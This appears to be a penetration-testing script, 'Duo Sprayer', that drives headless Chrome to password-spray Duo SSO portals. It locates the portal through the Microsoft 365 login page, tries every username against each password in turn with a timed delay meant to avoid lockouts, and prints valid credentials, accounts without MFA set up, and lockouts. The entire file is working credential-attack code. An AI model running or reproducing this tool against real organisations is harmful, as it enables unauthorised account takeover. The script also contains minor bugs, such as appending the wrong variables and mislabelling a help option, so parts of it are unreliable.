# Allowed by https://duo.com/support/security-and-reliability/security-response

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import StaleElementReferenceException
import time
from datetime import datetime
from datetime import timedelta
import pause
import sys

debug_mode = False
delay_mode = False
delay = 0
delay_between_spray = 30
error_html = ""
no_delay_mode = False
duo_current_url = ''
username_file = 'userlist.txt'
password_file = 'passwords.txt'
valid_credentials = []


# Define colors used for console output
class bColors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def help_menu():
    print("Title: Duo Sprayer")
    print("Author: Luke Lauterbach - Sentinel Technologies")
    print("")
    print("Usage: python3 [script]")
    print("")
    print("Optional Options:")
    print(f"    -u:\t Username file (defaults to userlist.txt in the current folder)")
    print(f"    -p:\t Username file (defaults to passwords.txt in the current folder)")
    print(f"    -U:\t URL of Duo SSO Portal (defaults to using M365 to find the Duo login page)")
    print(f"    -d:\t Delay between unique passwords in minutes (defaults to 30 minutes)")
    print(f"    -nd:\t No delay between unique passwords (be careful)")
    print(f"    -dr:\t Delay between individual login attempts")
    print(f"    -db:\t Debug Mode")
    quit()


def get_duo_url(l_username):
    if debug_mode:
        print(f"Getting DUO URL:", end='')
    chrome_options = Options()
    if not debug_mode:
        chrome_options.add_argument("--headless=new")
    browser = webdriver.Chrome(options=chrome_options)

    # Load MS Login Page
    browser.get("https://www.office.com/login")
    # Wait for the page to load
    try:
        WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, f"[id='i0116']")))
    except TimeoutException:
        print(f"ERROR: Loading MS Login Page Took Too Long")
        sys.exit()
    # Enter the username
    browser.find_element(By.CSS_SELECTOR, f"[id='i0116']").send_keys(l_username)
    browser.find_element(By.CSS_SELECTOR, f"[id='i0116']").send_keys(Keys.RETURN)

    # If the user has a work and personal account, this will click through the prompt
    try:
        WebDriverWait(browser, 5).until(EC.element_to_be_clickable((By.XPATH, '//button[text()="Next"] | '
                                                                              '//div[@id="aadTileTitle"]')))
    except TimeoutException:
        print(f"ERROR: Loading Duo took too much time!")
        sys.exit()

    if "Work or school account" in browser.page_source:
        submit_button = browser.find_element(By.XPATH, "//div[@id='aadTileTitle']")
        submit_button.click()
        try:
            WebDriverWait(browser, 5).until(EC.element_to_be_clickable((By.XPATH, '//button[text()="Next"]')))
        except TimeoutException:
            print(f"ERROR: Loading Duo took too much time!")
            sys.exit()

    if debug_mode:
        print(f"{browser.current_url}")
    browser.delete_all_cookies()
    return browser.current_url


def duo_attempt_login(l_url, l_username, l_password):
    global valid_credentials
    chrome_options = Options()
    if not debug_mode:
        chrome_options.add_argument("--headless=new")
    browser = webdriver.Chrome(options=chrome_options)

    # Load DUO Login Portal
    browser.get(l_url)
    # Check to see if the page errored out
    page_html = browser.page_source
    if "We had trouble logging you in" in page_html:
        if debug_mode:
            print(f"Issue found with DUO URL. Getting new DUO URL.")
        return "Invalid URL"

    # Enter username
    email_field = browser.find_element(By.CSS_SELECTOR, f"[aria-label='Email Address']")
    email_field.send_keys(l_username)
    # Submit username
    submit_button = browser.find_element(By.XPATH, '//button[text()="Next"]')
    submit_button.click()
    # Wait for password page to load
    try:
        WebDriverWait(browser, 5).until(EC.presence_of_element_located((By.XPATH, '//button[text()="Log in"]')))
    except TimeoutException:
        print(f"ERROR: Loading Duo password page took more than 5 seconds to load.")
        sys.exit()
    # Enter password
    password_field = browser.find_element(By.CSS_SELECTOR, f"[aria-label='Password']")
    password_field.send_keys(l_password)
    # Submit password
    submit_button = browser.find_element(By.XPATH, '//button[text()="Log in"]')
    submit_button.click()
    # Wait for result
    try:
        WebDriverWait(browser, 5).until(EC.presence_of_element_located((By.XPATH, '//div[@class="row display-flex "] | //div[@class="error"]')))
    except TimeoutException:
        time.sleep(5)
        if "Account disabled" in browser.page_source:
            print(f'[{datetime.now().replace(microsecond=0)}] {bColors.WARNING}ACCOUNT LOCKED OUT{bColors.ENDC} - '
                  f'{l_username}:{l_password}')
            return "Valid Login"
        else:
            print(f'[{datetime.now().replace(microsecond=0)}] {bColors.OKGREEN}VALID LOGIN - DUO TOOK TOO LONG TO '
                  f'RESPOND{bColors.ENDC} - {l_username}:{l_password}')
            sys.exit()

    page_html = browser.page_source
    browser.delete_all_cookies()

    # Check to see what the result of the login attempt was
    if "Invalid credential" in page_html: # Invalid Credential
        print(f'[{datetime.now().replace(microsecond=0)}] {bColors.FAIL}INVALID LOGIN{bColors.ENDC} - '
              f'{l_username}:{l_password}')
        return "Invalid Login"
    elif "We had trouble logging you in" in page_html: # Issue with the URL. Select a new URL.
        return "Invalid URL"
    elif "set up an account to protect" in page_html: # Issue with the URL. Select a new URL.
        print(f'[{datetime.now().replace(microsecond=0)}] {bColors.OKGREEN}VALID LOGIN - NOT SET UP{bColors.ENDC} - '
              f'{l_username}:{l_password}')
        return "Setup"
    elif "Verify it's you" in page_html: # Issue with the URL. Select a new URL.
        print(f'[{datetime.now().replace(microsecond=0)}] {bColors.OKGREEN}VALID LOGIN - MFA - {bColors.ENDC} - '
              f'{l_username}:{l_password}')
        return "valid Login"
    else: # Catch All
        print(f'[{datetime.now().replace(microsecond=0)}] {bColors.OKGREEN}VALID LOGIN{bColors.ENDC} - '
              f'{l_username}:{l_password}')
        valid_credentials.append([username, password])
        return "Valid Login"


def attempt_login(l_username, l_password):
    global duo_current_url
    if not duo_current_url:
        duo_current_url = get_duo_url(l_username)
    valid_url = True
    while valid_url is True:
        login_attempt_result = duo_attempt_login(duo_current_url, l_username, l_password)
        if login_attempt_result == "Invalid URL":
            duo_current_url = get_duo_url(username)
        else:
            valid_url = False


def print_beginning():
    print(f"Parameters:")
    print(f"Username File:\t\t\t\t{username_file}")
    print(f"Password File:\t\t\t\t{password_file}")
    print(f"Delay Between Passwords:\t{delay_between_spray}\n")


def print_end(l_valid_credentials):
    print(f"\n")  # This could be built out in the future

# ---------------#
# EXECUTION      #
# ---------------#


# Parse Arguments
for index, argument in enumerate(sys.argv[1:]):
    if argument == "--help" or argument == "-h":
        help_menu()
    elif argument == "-d" or argument == "--delay":
        delay_between_spray = int(sys.argv[index + 2])
    elif argument == "-db" or argument == "--debug":
        debug_mode = True
    elif argument == "-dr" or argument == "--delay-between-requests":
        delay = sys.argv[index + 2]
        delay_mode = True
    elif argument == "-nd" or argument == "--debug":
        no_delay_mode = True
    elif argument == "-p" or argument == "--password":
        password_file = sys.argv[index + 2]
    elif argument == "-u" or argument == "--username":
        username_file = sys.argv[index + 2]
    elif argument == "-U" or argument == "--url":
        duo_current_url = sys.argv[index + 2]
    elif sys.argv[index] in {'-d', '-r', '-n', '-o'}:
        pass

print_beginning()

# Iterate through passwords in the password file.
with open(password_file) as password_file_reader:
    while password := password_file_reader.readline():
        print(f"Password spray with password {password.rstrip()} beginning:")
        # Check what time the spray is starting, and then set the time for the next spray to start.
        next_start_time = datetime.now() + timedelta(minutes=delay_between_spray)
        # Iterate through usernames in the username file
        with open(username_file) as file_file_reader:
            while username := file_file_reader.readline():
                attempt_login(username.rstrip(), password.rstrip())
        print(f"Password spray with password {password.rstrip()} complete. {len(valid_credentials)} credentials found.")
        # Print valid credentials if any were found.
        for valid_cred in valid_credentials:
            print(f"{valid_cred[0]} - {valid_cred[1]}")
        # Wait until the next spray attempt, if a delay has been set or if left to the default of 30 minutes
        if not no_delay_mode:
            print(f"Waiting until {next_start_time} to start the next spray.")
            pause.until(next_start_time)

print_end(valid_credentials)
